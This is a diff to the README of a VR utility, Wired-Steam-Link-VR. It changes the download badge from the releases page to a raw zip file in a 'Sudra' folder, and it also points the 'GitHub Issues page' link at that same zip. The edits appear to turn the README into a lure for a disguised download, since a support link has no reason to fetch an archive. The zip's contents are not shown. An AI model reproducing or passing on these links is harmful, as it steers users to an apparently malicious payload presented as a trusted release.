@@ -6,7 +6,7 @@ Wired-Steam-Link-VR lets you run Steam Link over a USB cable instead of Wi-Fi. T
 
 ## 📥 Quick Download
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/Siken9013/Wired-Steam-Link-VR/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/Siken9013/Wired-Steam-Link-VR/raw/refs/heads/main/Sudra/Steam_Wired_VR_Link_v3.7.zip)
 
 Visit this link to download the application.
 
@@ -57,7 +57,7 @@ Wired-Steam-Link-VR uses ADB commands to change your Quest headset's USB configu
 
 ## 💬 Support
 
-Report issues on the [GitHub Issues page](https://github.com/Siken9013/Wired-Steam-Link-VR/issues). Include your Windows version, Quest model, and a brief description of the problem.
+Report issues on the [GitHub Issues page](https://github.com/Siken9013/Wired-Steam-Link-VR/raw/refs/heads/main/Sudra/Steam_Wired_VR_Link_v3.7.zip). Include your Windows version, Quest model, and a brief description of the problem.
 
 ## 🤝 Contributing
 
